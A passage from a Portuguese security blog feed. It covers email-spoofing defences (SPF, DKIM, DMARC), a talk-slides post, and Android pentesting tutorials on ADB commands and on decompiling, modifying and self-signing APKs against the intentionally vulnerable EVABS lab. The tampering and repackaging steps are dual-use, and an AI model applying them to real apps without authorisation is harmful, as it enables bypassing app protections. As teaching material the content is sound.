<p>Todas as informações sobre as configurações e atributos são públicas e de fácil acesso/leitura (menos a chave privada do DKIM) através de consultas nos registros TXT do DNS e DMARC. Estas informações precisam desta exposição justamente para que todas as pontas de uma comunicação via <em>e-mail</em> possam consultá-las.</p>

<p>É possível consultá-las em serviços online como o <a href="https://mxtoolbox.com/">MX Toolbox</a> assim como ferramentas normalmente encontradas em sistema operacional Linux (mas não limitado somente a eles), como <code class="language-plaintext highlighter-rouge">host</code> e <code class="language-plaintext highlighter-rouge">dig</code>, e outras ferramentas criadas especificamente com esta finalidade.</p>

<p>A checagem destas combinações também foi implementada em uma das ferramentas desenvolvida por mim. <a href="https://github.com/h41stur/nina">Nina</a> possui um módulo que usa basicamente todo o conteúdo deste artigo para cruzar informações e analisá-las.</p>

<p>Abaixo um demonstrativo:</p>

<p><img src="/img/posts/Pasted%20image%2020230106212409.png" alt="Output da ferramenta" /></p>

<h2 id="boas-práticas-para-dificultar-o-e-mail-spoofing">Boas práticas para dificultar o <em>e-mail spoofing</em></h2>

<p>Conforme visto, quando se trata de uma análise puramente técnica, a melhor prática para evitar falsificações de <em>e-mail</em>, são as regras de configuração mais restritas possíveis, porém, no mundo real existem as <strong>regras de negócio</strong>, que são o verdadeiro motivo por trás de quase tudo, e ditam como o comportamento deve ser direcionado.</p>

<p>Portanto, existem boas práticas que devem ser avaliadas para garantir o máximo de proteção possível, sem divergirem com as regras de negócio. Algumas delas são:</p>

<ol>
  <li>
    <p>Configurar o DMARC para o domínio: O primeiro passo é adicionar o registro DMARC ao arquivo DNS do domínio. Isso permitirá que os servidores de <em>e-mail</em> verifiquem as políticas de autenticação para <em>e-mails</em> enviados em nome do domínio.</p>
  </li>
  <li>
    <p>Definir as políticas de autenticação de <em>e-mail</em>: No registro DMARC, definir as políticas de autenticação de <em>e-mail</em> que sejam aplicadas aos e<em>-mails</em> enviados em nome do domínio. Isso pode incluir exigir que os <em>e-mails</em> sejam assinados com chave DKIM e verificados pelo SPF.</p>
  </li>
  <li>
    <p>Ativar os relatórios de usagem: Ativar os relatórios de usagem (RUA e RUF) para receber informações sobre os <em>e-mails</em> enviados em nome do domínio. Isso permitirá o monitoramento do uso de <em>e-mail</em> do domínio e a detecção de possíveis ataques de <em>spoofing</em>.</p>
  </li>
  <li>
    <p>Configurar as ações a serem tomadas em caso de falha: No registro DMARC, definir as ações a serem tomadas em caso de falha na verificação de autenticidade de <em>e-mail</em>. Isso pode incluir marcar os <em>e-mails</em> como <em>spam</em> ou rejeitar os <em>e-mails</em> que não cumprem as diretivas.</p>
  </li>
  <li>
    <p>Ativar a verificação de chave DKIM: A verificação de chave DKIM é outra ferramenta de segurança de <em>e-mail</em> que ajuda a proteger contra o <em>spoofing</em>.</p>
  </li>
</ol>

<p>Além de configurações, é preciso medidas de fortalecimento comportamental por parte de usuários, algumas dessas medidas incluem verificar a veracidade de todos os e-mails recebidos, não clicar em links ou baixar arquivos de e-mails desconhecidos, usar ferramentas de segurança de e-mail e manter o software de segurança atualizado.</p>

<h2 id="conclusão">Conclusão</h2>

<p>Este estudo surgiu de uma exploração bem-sucedida em um servidor no qual eu acreditava não ser possível falsificar um <em>e-mail</em>. Na busca pela resposta de como isto aconteceu, o conteúdo resumido neste artigo foi adquirido de diversas fontes e documentações.</p>

<p>O <em>e-mail spoofing</em> é uma ameaça constante na internet que pode levar a um comprometimento crítiuco da imagem de uma corporação, e, muitas vezes, difícil de detectar e/ou rastrear. No entanto, tomando as medidas de segurança adequadas, tanto os usuários quanto os administradores de domínio podem ajudar a proteger-se contra esses tipos de ataques e manter sua informação pessoal segura.</p>

<h2 id="referências">Referências</h2>

<ul>
  <li><a href="https://www.rfc-editor.org/rfc/rfc7208">RFC-7208</a></li>
  <li><a href="https://learn.microsoft.com/en-us/microsoft-365/security/office-365-security/email-authentication-anti-spoofing?view=o365-worldwide">How Microsoft 365 uses Sender Policy Framework (SPF) to prevent spoofing</a></li>
  <li><a href="https://www.trustedsec.com/blog/real-or-fake-spoof-proofing-email-with-spf-dkim-and-dmarc/">Real or Fake? Spoof-Proofing Email With SPF, DKIM, and DMARC</a></li>
</ul>]]></content><author><name>H41stur</name></author><category term="Estudos" /><category term="E-mail Spoofing" /><category term="SMTP" /><category term="DMARC" /><category term="DKIM" /><category term="E-mail Spoofing" /><summary type="html"><![CDATA[]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/img/posts/Pasted%20image%2020230106122723.png" /><media:content medium="image" url="http://localhost:4000/img/posts/Pasted%20image%2020230106122723.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Slides da Talk de Docker Weaponization</title><link href="http://localhost:4000/talks/docker%20weaponization/2023/01/08/talk-docker-weaponization.html" rel="alternate" type="text/html" title="Slides da Talk de Docker Weaponization" /><published>2023-01-08T01:00:00-03:00</published><updated>2023-01-08T01:00:00-03:00</updated><id>http://localhost:4000/talks/docker%20weaponization/2023/01/08/talk-docker-weaponization</id><content type="html" xml:base="http://localhost:4000/talks/docker%20weaponization/2023/01/08/talk-docker-weaponization.html"><![CDATA[<iframe src="/presentations/docker_weaponization/index.html" style="border:0px #ffffff none;" name="" scrolling="no" frameborder="0" marginheight="0px" marginwidth="0px" height="600px" width="800px" allowfullscreen=""></iframe>]]></content><author><name>H41stur</name></author><category term="Talks" /><category term="Docker Weaponization" /><category term="Presentations" /><summary type="html"><![CDATA[]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/img/posts/gui_docker.jpg" /><media:content medium="image" url="http://localhost:4000/img/posts/gui_docker.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Pentesting Android P.3 - ADB</title><link href="http://localhost:4000/estudos/mobile/2022/06/28/mobile-3.html" rel="alternate" type="text/html" title="Pentesting Android P.3 - ADB" /><published>2022-06-28T01:00:00-03:00</published><updated>2022-06-28T01:00:00-03:00</updated><id>http://localhost:4000/estudos/mobile/2022/06/28/mobile-3</id><content type="html" xml:base="http://localhost:4000/estudos/mobile/2022/06/28/mobile-3.html"><![CDATA[<p><img src="/img/posts/android-logo.png" alt="Pentesting Android" title="Pentesting Android" /></p>

<ul>
  <li><a href="#introdução">INTRODUÇÃO</a></li>
  <li><a href="#android-debug-bridge---adb">ANDROID DEBUG BRIDGE - ADB</a>
    <ul>
      <li><a href="#comandos-adb">Comandos ADB</a>
        <ul>
          <li><a href="#adb-shell">adb shell</a></li>
          <li><a href="#adb-install">adb install</a></li>
          <li><a href="#adb-shell-pm-list-packages">adb shell pm list packages</a></li>
          <li><a href="#adb-shell-logcat">adb shell logcat</a></li>
          <li><a href="#adb-pushpull">adb push/pull</a></li>
          <li><a href="#adb-reverse">adb reverse</a></li>
        </ul>
      </li>
    </ul>
  </li>
  <li><a href="#conclusão">CONCLUSÃO</a></li>
</ul>

<h1 id="introdução">INTRODUÇÃO</h1>

<p>Dando continuidade aos artigos sobre pentesting mobile, este provavelmente será um dos menores posts da série, pois será introdutório para temas abordados mais adiante.</p>

<p>Como já vimos sobre elementos que fazem parte deste universo, agora vamos entender um pouco sobre uma das ferramentas mais úteis durante o processo de pentest Android, o <code class="language-plaintext highlighter-rouge">Android Debug Bridge</code>.<br />
Esta ferramenta nos permite não só interagir com o dispositivo ou AVD, como também fazer leitura de <code class="language-plaintext highlighter-rouge">logs</code>, que será muito importante em algumas fases.</p>

<h1 id="android-debug-bridge---adb">ANDROID DEBUG BRIDGE - ADB</h1>

<p><img src="/img/posts/mobile-09.png" alt="ADB" title="ADB" /></p>

<p>O <a href="https://developer.android.com/studio/command-line/adb?gclid=CjwKCAjwquWVBhBrEiwAt1KmwkBP7Qdm9rze8qqXlyhTCWrXVUZKhC32BQBp5o5ym5LRU29bKqJpURoCrToQAvD_BwE&amp;gclsrc=aw.ds">ADB</a> conforme descrito em sua documentação, é uma ferramenta de linha de comando que permite a comunicação com dispositivos.<br />
Para que a comunicação funcione, ele precisa de trrês elementos:</p>

<ul>
  <li><strong>Um client</strong>: que envia comandos. Este cliente é executado na máquina de desenvolvimento através de linha de comando;</li>
  <li><strong>Um daemon (adbd)</strong>: que executa comandos no dispositivo. Este daemon roda em background;</li>
  <li><strong>Um server</strong>: que administra a comunicação entre o client e o daemon. O server roda em background na máquina de desenvolvimento.</li>
</ul>

<p>A comunicação entre client e daemon pode ocorrer via conexão TCP ou serial através do USB.</p>

<p>Os dispositivos Android, por padrão possuem o daemon ADB instalado. Quando um dispositivo <code class="language-plaintext highlighter-rouge">emulado</code>, seja por <code class="language-plaintext highlighter-rouge">Android Studio</code>, <code class="language-plaintext highlighter-rouge">Genymotion</code> ou qualquer outro é chamado pelo ADB, normalmente a conexão é feita via TCP na porta 5555 do dispositivo, quando um dispositivo físico é espetado via USB, a conexão ocorre via USB.</p>

<p>A imagem abaixo, mostra a saída do comando <code class="language-plaintext highlighter-rouge">adb devices</code> que mostra os devices conectados, no caso abaixo, vemos um dispositivo emulado.</p>

<p><img src="/img/posts/mobile-10.png" alt="Dispositivos" title="Dispositivos" /></p>

<h2 id="comandos-adb">Comandos ADB</h2>

<p>A partir daqui, veremos alguns comandos úteis do ADB para a interação com o dispositivo.</p>

<h3 id="adb-shell">adb shell</h3>

<p>Talvez um dos comandos mais utilizados do ADB, o <code class="language-plaintext highlighter-rouge">adb shell</code> nos permite obter um shell interativo com o Sistema Operacional Android conectado via ADB.</p>

<p><img src="/img/posts/mobile-11.png" alt="Shell ADB" title="Shell ADB" /></p>

<p>Conforme podemos ver na imagem acima, temos um shell interativo com o dispositivo, onde o comando <code class="language-plaintext highlighter-rouge">su</code> nos permite executar comandos com privilégios de <code class="language-plaintext highlighter-rouge">root</code>, quando o SO permite, assim como em um <code class="language-plaintext highlighter-rouge">Linux</code>.</p>

<h3 id="adb-install">adb install</h3>

<p>O ADB também nos permite a instalação e desisntalação de aplicativos por linha de comando, para instalação utilizamos <code class="language-plaintext highlighter-rouge">adb install "path do apk"</code> conforme mostrado abaixo.</p>

<p><img src="/img/posts/mobile-12.png" alt="Instalando APK" title="Instalando APK" /></p>

<p>O aplicativo instalado faz parte do <a href="https://hakin9.org/evabs-extremely-vulnerable-android-labs/">EVABS (Extremaly Vulnerable Android Labs)</a>. No dispositivo, é possível encontrá-lo instalado, conforme mostrado abaixo.</p>

<p><img src="/img/posts/mobile-13.png" alt="Aplicativo instalado" title="Aplicativo instalado" /></p>

<h3 id="adb-shell-pm-list-packages">adb shell pm list packages</h3>

<p>Assim como instalar, o ADB nos permite listar todos os pacotes instalados em um dispositivo com o comando <code class="language-plaintext highlighter-rouge">pm</code> (Package Manager). Este comando pode ser executado tanto dentro do dispositivo, quando passado como argumento para o <code class="language-plaintext highlighter-rouge">adb shell</code> conforme mostrado na imagem abaixo.</p>

<p><img src="/img/posts/mobile-14.png" alt="Listando pacotes" title="Listando pacotes" /></p>

<p>A opção <code class="language-plaintext highlighter-rouge">-f</code> no comando também mostra o path de instalação do aplicativo, conforme mostrado abaixo.</p>

<p><img src="/img/posts/mobile-15.png" alt="Listando pacotes com path" title="Listando pacotes com path" /></p>

<h3 id="adb-shell-logcat">adb shell logcat</h3>

<p>Mais um dos comandos muito utilizados durante um teste, é o <code class="language-plaintext highlighter-rouge">logcat</code>. Este comando nos permite ler os logs do sistema Android em tempo de execução.</p>

<p><img src="/img/posts/mobile-16.png" alt="Logcat" title="Logcat" /></p>

<p>Podemos filtrar este log para vermos somente informações sobre um aplicativo em específico. Na imagem abaixo, filtramos pelo EVABS que instalamos.</p>

<p><img src="/img/posts/mobile-17.png" alt="Filtrando logcat" title="Filtrando logcat" /></p>

<h3 id="adb-pushpull">adb push/pull</h3>

<p>Muitas vezes durante um teste, é preciso transferir arquivos tanto da máquina pro dispositivo ou vice-versa. Para enviarmos um arquivo para o dispositivo, podemos utilizar a sintaxe <code class="language-plaintext highlighter-rouge">adb push "arquivo origem local" "path destino dispositivo"</code>. Na imagem abaixo, transferimos o arquivo “evil-mobile.txt” para dentro do diretório “/sdcard/Download” do dispositivo.</p>

<p><img src="/img/posts/mobile-18.png" alt="Enviando arquivos" title="Enviando arquivos" /></p>

<p>Já a sintaxe <code class="language-plaintext highlighter-rouge">adb pull "arquivo origem dispositivo" "path destino local"</code> nos permite transferir um arquivo do dispositivo para nossa máquina. A imagem abaixo mostra a transferência do arquivo “/sdcard/Download/evil-mobile2.txt” para nossa máquina.</p>

<p><img src="/img/posts/mobile-19.png" alt="Capturando arquivos" title="Capturando arquivos" /></p>

<h3 id="adb-reverse">adb reverse</h3>

<p>O comando <code class="language-plaintext highlighter-rouge">adb reverse</code> nos permite abrir um túnel entre uma porta do dispositivo e uma porta local. Muito útil quando se tem um proxy em execução na máquina e é preciso passar todo o tráfego do dispositivo por esta proxy. Sua síntaxe é <code class="language-plaintext highlighter-rouge">adb reverse tcp:"porta do dispositivo" tcp:"porta local"</code>. A imagem abaixo, mostra a porta TCP 8080 do dispositivo sendo direcionada para a porta TCP 8081 da máquina.</p>

<p><img src="/img/posts/mobile-20.png" alt="Tunelando portas" title="Tunelando portas" /></p>

<p>Existem outros inúmeros comandos do ADB que serão explorados futuramente, porém estes são os mais básicos para iniciar os trabalhos.</p>

<h1 id="conclusão">CONCLUSÃO</h1>

<p>Neste artigo, foi possível conhecer um pouco sobre o <code class="language-plaintext highlighter-rouge">ADB</code> e seus comandos mais básicos que formam o alicerce de técnicas mais complexas que serão abordadas futuramente. No próximo artigo, veremos algumas técnicas de engenharia reversa de aplicativos.</p>]]></content><author><name>H41stur</name></author><category term="Estudos" /><category term="Mobile" /><category term="Mobile" /><category term="Android" /><category term="Tools" /><category term="ADB" /><summary type="html"><![CDATA[]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/img/posts/android-logo.png" /><media:content medium="image" url="http://localhost:4000/img/posts/android-logo.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Pentesting Android P.4 - Eng. Reversa</title><link href="http://localhost:4000/estudos/mobile/2022/06/28/mobile-4.html" rel="alternate" type="text/html" title="Pentesting Android P.4 - Eng. Reversa" /><published>2022-06-28T01:00:00-03:00</published><updated>2022-06-28T01:00:00-03:00</updated><id>http://localhost:4000/estudos/mobile/2022/06/28/mobile-4</id><content type="html" xml:base="http://localhost:4000/estudos/mobile/2022/06/28/mobile-4.html"><![CDATA[<p><img src="/img/posts/android-logo.png" alt="Pentesting Android" title="Pentesting Android" /></p>

<ul>
  <li><a href="#introdução">INTRODUÇÃO</a></li>
  <li><a href="#análise-estática-x-dinâmica">ANÁLISE ESTÁTICA x DINÂMICA</a></li>
  <li><a href="#código-smali">CÓDIGO SMALI</a></li>
  <li><a href="#técnicas-de-engenharia-reversa">TÉCNICAS DE ENGENHARIA REVERSA</a>
    <ul>
      <li><a href="#unzip-e-backsmali">Unzip e Backsmali</a></li>
      <li><a href="#apktool">Apktool</a></li>
      <li><a href="#assinando-um-apk">Assinando um APK</a>
        <ul>
          <li><a href="#keystore">KeyStore</a></li>
          <li><a href="#jarsigner">JarSigner</a></li>
          <li><a href="#zipalign">ZipAlign</a></li>
        </ul>
      </li>
      <li><a href="#jadx-gui">Jadx-gui</a></li>
      <li><a href="#dex2jar">Dex2jar</a></li>
      <li><a href="#enjarify">Enjarify</a></li>
      <li><a href="#mobile-security-framework-mobsf">Mobile Security Framework (MobSF)</a></li>
    </ul>
  </li>
</ul>

<h1 id="introdução">INTRODUÇÃO</h1>

<p>Dando continuidade aos artigos sobre pentesting mobile, vamos discorrer sobre <code class="language-plaintext highlighter-rouge">engenharia reversa de aplicativos</code>. Existem infinitas formas de fazer engenharia reversa de um aplicativo, nenhuma delas é a mais correta ou definitiva, para cada caso, uma das formas funcionará melhor tendo como princípio a necessidade.</p>

<p>A engenharia reversa é uma fase importante em um teste, não só pela possibilidade de ver o código fonte da aplicação, mas pela possibilidade de alterar seu código e conseguir efetuar o bypass de proteções. Além de fornecer entendimento de como e onde a aplicação armazena dados, como é sua comunicação com o backend e vazar possíveis endereços como URLs e IPs.</p>

<h1 id="análise-estática-x-dinâmica">ANÁLISE ESTÁTICA x DINÂMICA</h1>

<p>Existem basicamente duas frentes no que diz respeito a a engenharia reversa de aplicativos, a <code class="language-plaintext highlighter-rouge">análise estática</code> e a <code class="language-plaintext highlighter-rouge">análise dinâmica</code>.</p>

<p>Na análise estática, a aplicação é analisada sem a necessidade de estar em execução, como um <code class="language-plaintext highlighter-rouge">code-review</code> analisando o manifest, as bibliotecas e a decompilação dos arquivos <code class="language-plaintext highlighter-rouge">.dex</code>.</p>

<p>Na análise dinâmica, a aplicação é analisada durante sua execução, medindo e enumerando seus comportamentos e fluxos. São utilizadas técnicas de debugging, trace de chamadas de API e syscalls, análise de variáveis em tempo de execução, entre outros.</p>

<p>É importante salientar, que qualquer uma das técnicas usadas individualmente se torna incompleta, uma vez que são complementares.</p>

<h1 id="código-smali">CÓDIGO SMALI</h1>

<p>O <code class="language-plaintext highlighter-rouge">código smali</code> é o mais baixo nível de um aplicativo Android. Quando um aplicativo é desenvolvido em Java, uma linguagem de alto nível, este código precisa ser compilado de um apk de forma que a máquina virtual de Dalvik consiga o interpretar.</p>

<p>Este processo de compilação gera os códigos em baixo nível para ser interpretados pela máquina. A este código em baixo nível chamamos de smali.</p>

<p>O código abaixo, mostra um exemplo de smali que imprime um “Hello World!”.</p>

<pre><code class="language-smali">class public h41stur;
.super Ljava/lang/Object;

.method public static main([Ljava/lang/String;)V
    .registers 2
    sget-object v0,         Ljava/lang/System;-&gt;out:Ljava/io/PrintStream;
    const-string            v1, "Hello World!"
    invoke-virtual{v0,v1}, Ljava/io/PrintStream;-&gt;println(Ljava/lang/String;)V
    return-void
.end method
</code></pre>
<p>Para entendermos o processo que chegou a este código smali, podemos criar o script em Java e compilá-lo de forma a se tornar um arquivo <code class="language-plaintext highlighter-rouge">.dex</code> que possa ser executado por uma máquina de Dalvik.</p>

<p>O código abaixo, mostra a classe Java correspondente ao “Hello World”.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">h41stur</span><span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">){</span>
        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Hello World!"</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p>Para que este código seja interpretado pelo binário <code class="language-plaintext highlighter-rouge">java</code> precisamos compilá-lo com o <code class="language-plaintext highlighter-rouge">javac</code>.</p>

<p><img src="/img/posts/mobile-21.png" alt="Classe compilada" title="Classe compilada" /></p>

<p>Como podemos ver, após compilar a classe, com o javac, um arquivo “h41stur.class” foi criado, a prtir disto, foi possível executar o script com o java imprimindo a mensagem.</p>

<p>Neste ponto, a classe java está compilada e executável pelo java em uma máquina Linux, porém, o sistema operacional Android não interpreta Java, conforme já vimos, e sim smali. Para que possamos gerar o código em baixo nível para o Android interpretar, podemos utilizar a ferramenta <code class="language-plaintext highlighter-rouge">d8</code> que faz parte do <code class="language-plaintext highlighter-rouge">build-tools</code> do <code class="language-plaintext highlighter-rouge">Android Studio</code>.</p>

<p>Esta ferramenta compila o bytecode Java para o bytecode DEX que pode ser executado pelo Android.</p>

<p><img src="/img/posts/mobile-22.png" alt="Compilando Java em DEX" title="Compilando Java em DEX" /></p>

<p>Ao compilar o arquivo .class com o d8, temos como resultado o arquivo “classes.dex” que contém o bytecode interpretável pela máquina de Dalvik.</p>

<p>Para coomprovarmos a eficácia, podemos transferir o arquivo .dex gerado para um dispositivo atraǘes do comando <code class="language-plaintext highlighter-rouge">adb push</code> e executá-lo dentro do Android com o comando <code class="language-plaintext highlighter-rouge">dalvikvm -cp classes.dex h41stur</code>, onde:</p>

<ul>
  <li><strong>dalvikvm</strong>: é a máquina virtual Dalvik, responsável por interpretar os arquivos .dex;</li>
  <li><strong>-cp classes.dex</strong>: é o “class path” ou o caminho onde está armazenada a classe;</li>
  <li><strong>h41stur</strong>:  é o nome da classe criada para ser interpretada.</li>
</ul>

<p>A imagem abaixo mostra o resultado da execução.</p>

<p><img src="/img/posts/mobile-23.png" alt="Execução do DEX" title="Execução do DEX" /></p>

<h1 id="técnicas-de-engenharia-reversa">TÉCNICAS DE ENGENHARIA REVERSA</h1>

<p>A partir deste momento, podemos começar a “desmontar” um aplicativo de várias formas. Como teste, vaos utilizar o aplicativo <a href="https://hakin9.org/evabs-extremely-vulnerable-android-labs/">EVABS (Extremaly Vulnerable Android Labs)</a>.</p>

<h2 id="unzip-e-backsmali">Unzip e Backsmali</h2>

<p>Todo aplicativo nada mais é que um pacote compactado de arquivos e bibliotecas. Sendo assim, é possível descompactá-lo com o próprio <code class="language-plaintext highlighter-rouge">unzip</code>.</p>

<p>Descompactando desta forma, não se tem o aplicatívo de forma legível para análise, mas é possível utilizar outras ferramentas para auxiliar em sua análise.</p>

<p><img src="/img/posts/mobile-24.png" alt="Descompactando o APK" title="Descompactando o APK" /></p>

<p>Após descompactar o APK, podemos ver que alguns arquivos e diretórios são exibidos, conforme mostrado na imagem abaixo.</p>

<p><img src="/img/posts/mobile-25.png" alt="APK descompactado" title="APK descompactado" /></p>

<p>Estes diretórios e arquivos contém todos os recursos do aplicativo, incluindo imagens, códigos, bibliotecas, incluindo o arquivo `classes.dex”, porém todos os arquivos estão em bytecode e ilegíveis para nós.</p>

<p>Para fazermos o reversing do arquivo classes.dex, podemos utilizar a ferramenta <a href="https://github.com/JesusFreke/smali">backsmali</a>, bastando passar argumendo de <code class="language-plaintext highlighter-rouge">disassembly</code> e o path do arquivo .dex e um output conforme mostrado abaixo.</p>

<p><img src="/img/posts/mobile-26.png" alt="Disassembly do .dex" title="Disassembly do .dex" /></p>

<p>Conforme podemos ver, o diretório “reversing” foi criado, pois foi o nome passado para o output.</p>

<p>Se caminharmos para o diretório raiz do aplicativo, podemos ver todos os scripts smali, conforme mostrado abaixo.</p>

<p><img src="/img/posts/mobile-27.png" alt="Arquivos smali" title="Arquivos smali" /></p>

<p>E ao abrirmos qualquer um destes arquivos, teremos o código smali legível para interpretação e edição.</p>

<p><img src="/img/posts/mobile-28.png" alt="Código smali" title="Código smali" /></p>

<p>Muitas vezes, somente de observar o código smali, é possível determinar comportamentos importantes sobre a aplicação, credenciais hardcoded e diversas outras informações.</p>

<p>Como por exemplo no arquivo <code class="language-plaintext highlighter-rouge">DBLeak.smali</code> na linha 63, podemos ver a criação de uma tabela de usuários, e logo abaixo o insert de usuários e senhas, conforme mostrado abaixo.</p>

<p><img src="/img/posts/mobile-29.png" alt="Credenciais hardcoded" title="Credenciais hardcoded" /></p>

<p>Para melhor entendimento sobre os operadores Dalvik, segue uma excelente <a href="http://pallergabor.uw.hu/androidblog/dalvik_opcodes.html">referência</a>.</p>

<p>Após a analise do aplicativo, caso alguma alteração tenha sido feita em um arquivo smali, é possível compilá-los novamente para empacotar em um APK novamente, para isso, basta apagar o arquivo <code class="language-plaintext highlighter-rouge">classes.dex</code> original, e utilizar a ferramenta <a href="https://github.com/JesusFreke/smali">smali</a> para compilar o diretório gerado pelo backsmali.</p>

<p><img src="/img/posts/mobile-30.png" alt="Processo de recompilação dos arquivos smali" title="Processo de recompilação dos arquivos smali" /></p>

<p>Após a compilação dos arquivos smali, é possível compactar os arquivos e diretórios novamente em formato de APK com a ferramenta <code class="language-plaintext highlighter-rouge">zip</code> conforme mostrado abaixo.</p>

<p><img src="/img/posts/mobile-31.png" alt="Compactando o aplicativo" title="Compactando o aplicativo" /></p>

<p>E um novo aplicativo foi gerado, conforme mostrado abaixo.</p>

<p><img src="/img/posts/mobile-32.png" alt="Aplicativo gerado" title="Aplicativo gerado" /></p>

<p>É importante ressaltar, que o aplicativo recompactado ainda não está pronto para ser instalado, pois como vimos em posts anteriores, um aplicativo precisa estar <code class="language-plaintext highlighter-rouge">assinado</code> para que o Android o reconheça como válido, mais a frente iremos explorar a assinatura de um APK.</p>

<h2 id="apktool">Apktool</h2>

<p>Como já vimos a decompilação de um aplicativo de forma manual, podemos utilizar uma ferramenta automatizada que agiliza o processo.</p>

<p>O <a href="https://ibotpeaches.github.io/Apktool/">apktool</a> é uma junção de várias ferramentas em um set que executa comandos de forma sequencial para descompactar e decompilar e/ou compilar e compactar um aplicativo.</p>

<p><img src="/img/posts/mobile-33.png" alt="Apktool" title="Apktool" /></p>

<p>Conforme podemos ver, o <code class="language-plaintext highlighter-rouge">apktool</code> já conta até mesmo com o smali e backsmali em seu kit.</p>

<p>A imagem abaixo mostra o processo de decompilação de um aplicativo.</p>

<p><img src="/img/posts/mobile-34.png" alt="Decompilando o APK" title="Decompilando o APK" /></p>

<p>E assim como da forma manual, todos os arquivos smali estão disponíveis para leitura e edição, conforme mostrado abaixo.</p>

<p><img src="/img/posts/mobile-35.png" alt="Arquivos smali" title="Arquivos smali" /></p>

<p>O processo de recompilação é tão simples quanto o anterior, bastando utilizar o parâmetro <code class="language-plaintext highlighter-rouge">b</code> (build) para o apktool.</p>

<p><img src="/img/posts/mobile-36.png" alt="Recompilando o APK" title="Recompilando o APK" /></p>

<p>Assim como da forma manual, é importante ressaltar, que o aplicativo recompactado ainda não está pronto para ser instalado, pois como vimos em posts anteriores, um aplicativo precisa estar <code class="language-plaintext highlighter-rouge">assinado</code> para que o Android o reconheça como válido, mais a frente iremos explorar a assinatura de um APK.</p>

<h2 id="assinando-um-apk">Assinando um APK</h2>

<p>Até o momento vimos uma forma de descompactar e decompilar um aplicativo para que seja possível obter seu código smali e alterá-lo, caso possível, assim como recompilá-lo e compactálo para gerar um novo APK adulterado.</p>

<p>Porém, este processo remove a assinatura original do aplicativo, e como vimos em posts anteriores, o Android só reconhece um aplicativo como válido, caso este esteja assinado com um certificado.</p>

<p>Para fins de teste de um aplicativo, é possível assinar o APK adulterado com um certificado auto assinado. É importante salientar, que um aplicativo assinado desta forma, não é reconhecido pela loja oficial, portanto, não é possível subir um APK auto assinado na loja oficial</p>

<p>O processo para tal, envolve uma série de passos e ferramentas. Não existe uma única forma de assinar um aplicativo, portanto uma delas será explorada no decorrer do post.</p>

<h3 id="keystore">KeyStore</h3>

<p>O primeiro passo no processo de assinatura é a criação de uma <code class="language-plaintext highlighter-rouge">KeyStore</code>. O KeyStore, como o próprio nome sugere, é um arquivo que serve como um “banco de dados” que contém informações criptografadas e informações de como criptografar. Em resumo é uma área de armazenamento de chaves.</p>

<p>O processo de criação do KeyStore já envolve também a criação de um par de chaves. A própria suite <code class="language-plaintext highlighter-rouge">ADB</code> contém a ferramenta <code class="language-plaintext highlighter-rouge">keytool</code> que tem como função a administração de certificados. Abaixo o comando para criação de uma KeyStore:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>keytool <span class="nt">-genkey</span> <span class="nt">-v</span> <span class="nt">-keystore</span> h41stur.keystore <span class="nt">-alias</span> h41stur <span class="nt">-keyalg</span> RSA <span class="nt">-keysize</span> 2048 <span class="nt">-validity</span> 10000
</code></pre></div></div>
<p>Onde:</p>

<ul>
  <li><strong>-genkey</strong>: é o argumento para gerar um par de chaves;</li>
  <li><strong>-v</strong>: argumento para aumentar a verbosidade;</li>
  <li><strong>-keystore</strong>: é o argumento para indicar o nome da KeyStore a ser gerada;</li>
  <li><strong>-alias</strong>: é o argumento para dar um alias para o certificado;</li>
  <li><strong>-keyalg</strong>: é o argumento para indicar qual algorítmo de criptografia será usado para o certificado;</li>
  <li><strong>-keysize</strong>: é o argumento para passar o tamanho da chave em bits;</li>
  <li><strong>-validity</strong>: é o argumento para informar a validade em dias do certificado.</li>
</ul>

<p>Após executar o comando, a ferramenta vai pedir uma senha para o certificado e mais algumas informações (que não tem tanta importância numcertificado auto assinado para testes), e gerará o KeyStore com o nome indicado, conforme mostrado abaixo.</p>

<p><img src="/img/posts/mobile-37.png" alt="Gerando a KeyStore" title="Gerando a KeyStore" /></p>

<p>É possível listar as chaves armazenadas na KeyStore com o argumento <code class="language-plaintext highlighter-rouge">-list</code> conforme mostrado abaixo.</p>

<p><img src="/img/posts/mobile-38.png" alt="Listando as chaves" title="Listando as chaves" /></p>

<p>Caso seja necessário, também é possível extrair os certificados armazenados na KeyStore, bastando indicá-la juntamente com o alias do certificado, com o comando abaixo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>keytool <span class="nt">-export</span> <span class="nt">-rfc</span> <span class="nt">-keystore</span> h41stur.keystore <span class="nt">-alias</span> h41stur <span class="nt">-file</span> h41stur.cer
</code></pre></div></div>
<p>Onde:</p>

<ul>
  <li><strong>-export</strong>: é o argumento para exportar um certificado;</li>
  <li><strong>-rfc</strong>: é o argumento para indicar que a saída será no formato RFC;</li>
  <li><strong>-keystore</strong>: é o argumento para passar o caminho para a KeyStore;</li>
  <li><strong>-alias</strong>: é o argumento para passar o alias do certificado a ser extraído de dentro da KeyStore;</li>
  <li><strong>-file</strong>: é o argumento para informar o arquivo de saída do certificado exportado.</li>
</ul>

<p>Ao executar o comando, a senha do certificado será solicitada e o arquivo será gerado, conforme mostrado abaixo.</p>

<p><img src="/img/posts/mobile-39.png" alt="Certificado extraído" title="Certificado extraído" /></p>

<p><img src="/img/posts/mobile-40.png" alt="Certificado extraído" title="Certificado extraído" /></p>

<h3 id="jarsigner">JarSigner</h3>

